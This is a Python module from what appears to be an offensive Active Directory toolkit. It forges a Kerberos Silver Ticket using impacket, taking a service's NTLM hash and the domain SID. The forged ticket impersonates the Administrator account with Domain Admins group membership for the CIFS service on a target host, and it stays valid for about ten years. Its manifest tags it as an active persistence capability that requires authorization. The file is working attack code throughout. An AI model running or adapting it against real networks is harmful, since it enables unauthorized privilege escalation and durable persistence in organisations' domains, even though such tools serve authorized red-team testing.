"""Silver Ticket — forge TGS for a specific service using its NTLM hash."""

from __future__ import annotations

import os
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.persistence.silver_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["forged_kerberos_ticket"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.002"],
}


def run(args: Any) -> int:
    service_hash = getattr(args, "service_hash", None)
    domain_sid = getattr(args, "domain_sid", None)

    if not service_hash:
        print("[!] Silver Ticket requires --service-hash", file=sys.stderr)
        return 1
    if not domain_sid:
        print("[!] Silver Ticket requires --domain-sid", file=sys.stderr)
        return 1

    print(f"[*] Silver Ticket → {args.target} ({args.domain})")

    try:
        from impacket.examples.ticketer import TICKETER
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    spn = f"cifs/{args.target}"

    try:
        options = type("Options", (), {
            "target": args.target,
            "domain": args.domain,
            "domain_sid": domain_sid,
            "nthash": service_hash,
            "aesKey": None,
            "user": "Administrator",
            "user_id": 500,
            "groups": "513,512",
            "spn": spn,
            "duration": 87600,
            "extra_sid": None,
            "extra_pac": False,
            "old_pac": False,
        })()

        ticketer = TICKETER("", args.domain, options)
        ticketer.run()
        print(f"[+] Silver Ticket for {spn} generated")
        return 0
    except Exception as exc:
        print(f"[-] Silver Ticket generation failed: {exc}", file=sys.stderr)
        return 1
